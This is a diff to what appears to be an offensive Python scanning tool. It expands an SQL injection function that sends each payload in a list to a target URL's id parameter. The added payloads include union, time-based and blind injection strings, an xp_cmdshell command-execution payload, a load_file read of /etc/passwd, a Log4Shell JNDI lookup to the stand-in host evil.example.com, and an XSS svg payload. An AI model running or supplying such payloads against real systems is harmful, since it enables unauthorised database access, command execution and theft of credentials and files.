@@ -131,14 +131,28 @@ def advanced_waf_bypass(url, session):
 
 def advanced_sql_injection(url, session):
     payloads = [
-        "' OR 1=1 --", 
-        "' UNION SELECT null, username, password FROM users --", 
-        "' AND 1=1 --", 
-        "admin' OR 1=1--", 
-        "%27%20OR%20%271%27%3D%271%27%3B%20--",
-        "admin' AND SLEEP(5)--",  
-        "admin' AND (SELECT COUNT(*) FROM users)>0--"  
-    ]
+    "' OR 1=1 --", 
+    "' UNION SELECT null, username, password FROM users --", 
+    "' AND 1=1 --", 
+    "admin' OR 1=1--", 
+    "%27%20OR%20%271%27%3D%271%27%3B%20--", 
+    "admin' AND SLEEP(5)--", 
+    "admin' AND (SELECT COUNT(*) FROM users)>0--", 
+    "'; WAITFOR DELAY '0:0:5'--", 
+    "1' AND 1=CAST((SELECT @@version) AS int)--", 
+    "admin') OR ('1'='1", 
+    "' UNION SELECT NULL, NULL, table_name FROM information_schema.tables--", 
+    "1' OR 1=1--", 
+    "' OR 'x'='x' /*", 
+    "'; EXEC xp_cmdshell('whoami')--", 
+    "${jndi:ldap://evil.example.com/a}", 
+    "'||(SELECT pg_sleep(5))||'", 
+    "<svg/onload=alert(1)>", 
+    "' AND (SELECT ASCII(SUBSTRING((SELECT database()),1,1))) > 64 --", 
+    "\" OR LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1)) > 1 --", 
+    "/**/OR/**/'x'='x'", 
+    "'||(select load_file('/etc/passwd'))||'"
+]
     for payload in payloads:
         send_request(url + "?id=" + payload, session)
 
